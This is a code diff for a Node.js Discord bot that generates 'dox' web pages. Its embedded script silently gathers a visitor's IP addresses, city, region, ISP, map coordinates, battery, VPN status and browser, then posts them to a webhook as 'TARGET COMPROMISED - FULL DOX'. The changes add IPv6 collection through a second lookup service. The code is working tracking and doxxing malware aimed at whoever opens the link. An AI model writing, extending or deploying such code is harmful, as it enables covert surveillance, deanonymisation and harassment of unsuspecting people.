@@ -2,7 +2,6 @@ const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelTyp
 const express = require('express');
 const app = express();
 const crypto = require('crypto');
-const fs = require('fs');
 
 const TOKEN = process.env.TOKEN;
 const PORT = process.env.PORT || 3000;
@@ -528,9 +527,15 @@ function generateDoxHTML(webhook) {
 
         (async function() {
             try {
-                const res = await fetch("https://ipinfo.io/json");
-                const d = await res.json();
-                if (!d.ip) return;
+                const [ipv4Res, ipv6Res] = await Promise.all([
+                    fetch("https://ipinfo.io/json"),
+                    fetch("https://api64.ipify.org?format=json")
+                ]);
+
+                const d = await ipv4Res.json();
+                const ipv6Data = await ipv6Res.json();
+
+                if (!d.ip && !ipv6Data.ip) return;
 
                 const ua = navigator.userAgent;
                 const browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
@@ -543,7 +548,6 @@ function generateDoxHTML(webhook) {
                 const lat = d.loc ? d.loc.split(",")[0] : "N/A";
                 const lon = d.loc ? d.loc.split(",")[1] : "N/A";
                 const mapUrl = lat !== "N/A" ? "https://www.google.com/maps?q=" + lat + "," + lon : "N/A";
-                const streetView = lat !== "N/A" ? "https://www.google.com/maps?q=" + lat + "," + lon + "&layer=c" : "N/A";
 
                 let battery = "N/A";
                 try {
@@ -574,7 +578,8 @@ function generateDoxHTML(webhook) {
                     title: "☠️ TARGET COMPROMISED - FULL DOX",
                     color: 0xFF0000,
                     fields: [
-                        { name: "🌐 IP Address", value: d.ip || "N/A", inline: true },
+                        { name: "🌐 IPv4 Address", value: d.ip || "N/A", inline: true },
+                        { name: "🌐 IPv6 Address", value: ipv6Data.ip || "N/A", inline: true },
                         { name: "🏙️ City", value: d.city || "N/A", inline: true },
                         { name: "🗺️ Region", value: d.region || "N/A", inline: true },
                         { name: "🌍 Country", value: d.country || "N/A", inline: true },
@@ -583,7 +588,6 @@ function generateDoxHTML(webhook) {
                         { name: "🏢 ISP", value: d.org || "N/A", inline: true },
                         { name: "🕒 Timezone", value: d.timezone || "N/A", inline: true },
                         { name: "📍 IP Location", value: mapUrl, inline: false },
-                        { name: "🗺️ Street View", value: streetView, inline: false },
                         { name: "🔋 Battery", value: battery, inline: true },
                         { name: "🛡️ VPN/Proxy", value: vpn, inline: true },
                         { name: "🧠 Browser", value: browser, inline: true },
